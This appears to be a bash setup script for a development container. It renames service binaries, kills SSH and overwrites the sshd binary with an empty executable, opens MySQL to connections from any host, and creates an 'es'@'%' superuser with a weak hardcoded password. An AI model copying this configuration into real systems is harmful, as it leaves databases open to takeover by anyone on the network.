#!/bin/bash

bad_commands=(
  '/etc/init.d/mysql'
  '/etc/init.d/php5-fpm'
  '/etc/init.d/nginx'
  '/etc/init.d/nginx'
  '/usr/bin/npm'
  '/usr/bin/cnpm'
  '/usr/bin/mysql'
  '/usr/sbin/sshd'
)

# remove bad commands
for command in ${bad_commands[@]};
do  
  if [ -f "$command" ]; then
    echo "mv ${command}..."
    mv $command ${command%/*}/_${command##*/}
  fi
done

# disable ssh service
echo "disable ssh service..."
pkill sshd
touch /usr/sbin/sshd
chmod +x /usr/sbin/sshd

# enable mysql remote access
echo "enable mysql remote access..."
sed -i "s/bind-address/#bind-address/g" /etc/mysql/my.cnf
supervisorctl restart mysql

echo "CREATE USER 'es'@'%' IDENTIFIED BY 'kaifazhe';" | _mysql
echo "GRANT ALL PRIVILEGES ON *.* TO 'es'@'%' IDENTIFIED BY 'kaifazhe' WITH GRANT OPTION;" | _mysql
echo "FLUSH PRIVILEGES;" | _mysql

echo "all done!"